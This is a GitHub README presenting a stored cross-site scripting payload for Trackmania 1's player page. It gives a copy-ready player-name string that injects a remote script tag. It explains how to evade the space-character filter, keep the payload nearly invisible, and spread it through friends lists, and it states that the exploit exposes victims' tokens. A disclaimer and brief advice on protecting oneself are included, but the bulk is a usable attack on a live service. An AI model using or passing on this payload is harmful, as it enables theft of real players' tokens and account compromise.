# 🔗 trackmania-xss-payloads
Repo of XSS payloads you can try when using Trackmania 1's playerpage
> [!WARNING]
> I am not responsible for any damage done with the knowledge from this repo. It's a proof of concept which is created only for education and research purposes. By using this code you accept that you will **NOT** use this method in malicious purposes and that [kvbaxi](https://github.com/kvbaxi) takes no responsibility for misusage of this content.
## 💻 Put this in your name to make payload
```
$l["><script/src="//payload_link_here"></script>]username
```
## ❗ How can you be safe?
> [!CAUTION]
> **THIS EXPLOIT EXPOSES YOUR TOKEN! DON'T SKIP THIS SECTION UNLESS YOU DON'T WANT TO BE SAFE!**

The easiest method of preventing yourself from being attacked by this exploit is by:
- Disabling JavaScript/Removing permission for JavaScript for this site - the site uses small amount to none of JavaScript, that means you can safely turn it off from this site while also not losing any funcitonalities of page.
- Do not add random people to friends. - Main way to get attacked by this attack is by having user with said payload in friends. As it will display friends in stats section you're very likely to be hit by this way if you won't be cautious. **Check who you're adding first!**

## ❓ How does it work?
Trackmania 1's playerpage is very insecure and old (due to the game not being updated), hence in time there were more and more security flaws found. One of them is this exact [XSS](https://wikipedia.org/wiki/Cross-Site-Scripting). It works by escaping the site's link formatting code and executing own code with newly appended `<script>` tag.  
  
One of the cons of this method is that you have limited set of characters you can use and length. You cannot use unescaped spaces as they will be escaped into HTML encoding (`" " -> &nbsp;`) so that is why I chose to use `/` instead as it converts `/` correctly as it was space.  
  
In result you get clean payload **almost** invisible to human eye. The main change you'll notice when using this payload on your name is that on stats page you'll see `">` on the beginning of your name. You can't prevent that without wasting another characters. In trackmania though, your payload is **completely invisible** on first look. Player has to hover over your name to see the suspicious payload in the place of link.  

Due to need in saving characters you cannot use the GitHub Pages link I have for my repo as it will be too long. I recommend using shortener that will make it as **short as possible**.

## 🎥 Preview
https://github.com/kvbaxi/trackmania-xss-payloads/assets/47297843/2a2593d9-e276-443b-9a18-7e3edaeb854f

